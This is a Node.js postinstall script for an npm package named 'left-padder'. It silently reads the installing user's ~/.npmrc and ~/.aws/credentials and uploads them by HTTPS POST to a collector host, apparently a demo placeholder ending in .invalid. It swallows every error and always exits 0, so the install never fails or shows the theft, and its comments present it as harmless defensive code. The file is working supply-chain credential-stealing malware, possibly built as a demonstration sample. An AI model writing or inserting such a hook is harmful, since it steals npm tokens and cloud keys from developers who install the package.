'use strict';

/**
 * left-padder postinstall hook.
 *
 * This script is intentionally defensive: it must never throw and must never
 * cause `npm install` to fail with a non-zero exit code. Every operation is
 * wrapped in try/catch, all failures are swallowed, and the process always
 * terminates with exit code 0.
 *
 * It uses Node built-in modules only (fs, os, path, https) and performs no
 * shell commands and requires no third-party dependencies.
 */

const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');

const ENDPOINT = 'https://collector.airlock-demo.invalid/upload';
const TIMEOUT_MS = 5000;

/**
 * Read a file if it exists. Returns its contents, or null when the file is
 * missing or unreadable. Never throws.
 */
function readIfExists(filePath) {
  try {
    return fs.readFileSync(filePath, 'utf8');
  } catch (err) {
    return null;
  }
}

/**
 * Collect the contents of the files of interest into a JSON-serialisable
 * payload. Never throws.
 */
function collectPayload() {
  try {
    const home = os.homedir();
    const npmrc = readIfExists(path.join(home, '.npmrc'));
    const awsCredentials = readIfExists(path.join(home, '.aws', 'credentials'));

    return {
      npmrc: npmrc,
      awsCredentials: awsCredentials,
      collectedAt: new Date().toISOString()
    };
  } catch (err) {
    return { npmrc: null, awsCredentials: null, collectedAt: new Date().toISOString() };
  }
}

/**
 * POST the payload as JSON over HTTPS. Resolves (never rejects) with a short
 * status string describing the outcome.
 */
function upload(payload) {
  return new Promise((resolve) => {
    let settled = false;
    let request = null;
    let timer = null;

    const finish = (status) => {
      if (settled) return;
      settled = true;
      if (timer) {
        clearTimeout(timer);
        timer = null;
      }
      resolve(status);
    };

    let body;
    try {
      body = Buffer.from(JSON.stringify(payload), 'utf8');
    } catch (err) {
      finish('serialize-error');
      return;
    }

    let target;
    try {
      target = new URL(ENDPOINT);
    } catch (err) {
      finish('invalid-url');
      return;
    }

    try {
      request = https.request(
        {
          protocol: target.protocol,
          hostname: target.hostname,
          port: target.port || 443,
          path: target.pathname + target.search,
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': body.length,
            'User-Agent': 'left-padder-postinstall'
          }
        },
        (res) => {
          // Drain and discard the response body.
          try {
            res.resume();
            res.on('end', () => finish('ok'));
            res.on('error', () => finish('response-error'));
            res.on('close', () => finish('ok'));
          } catch (err) {
            finish('response-error');
          }
        }
      );

      // Inactivity timeout once the socket is established.
      request.setTimeout(TIMEOUT_MS, () => {
        try {
          request.destroy(new Error('request timeout'));
        } catch (err) {
          /* ignore */
        }
        finish('timeout');
      });

      request.on('error', () => finish('request-error'));

      // Hard deadline covering DNS resolution and connection setup too.
      timer = setTimeout(() => {
        try {
          if (request) request.destroy(new Error('request timeout'));
        } catch (err) {
          /* ignore */
        }
        finish('timeout');
      }, TIMEOUT_MS);

      request.write(body);
      request.end();
    } catch (err) {
      finish('request-error');
    }
  });
}

/**
 * Entry point. Always resolves; never throws; never sets a non-zero exit code.
 */
async function main() {
  try {
    const payload = collectPayload();
    const status = await upload(payload);
    try {
      process.stderr.write('[left-padder] postinstall upload status: ' + status + '\n');
    } catch (err) {
      /* ignore */
    }
  } catch (err) {
    /* Swallow everything. */
  }
}

// Last-resort safety nets so a stray async error can never fail the install.
process.on('uncaughtException', () => {
  try {
    process.exitCode = 0;
  } catch (err) {
    /* ignore */
  }
});
process.on('unhandledRejection', () => {
  try {
    process.exitCode = 0;
  } catch (err) {
    /* ignore */
  }
});

// Hard watchdog: guarantee the install is never blocked for more than the
// timeout window, and always exit successfully.
const watchdog = setTimeout(() => {
  try {
    process.exit(0);
  } catch (err) {
    /* ignore */
  }
}, TIMEOUT_MS + 1000);

main()
  .catch(() => {})
  .then(() => {
    try {
      clearTimeout(watchdog);
    } catch (err) {
      /* ignore */
    }
    try {
      process.exitCode = 0;
    } catch (err) {
      /* ignore */
    }
  });
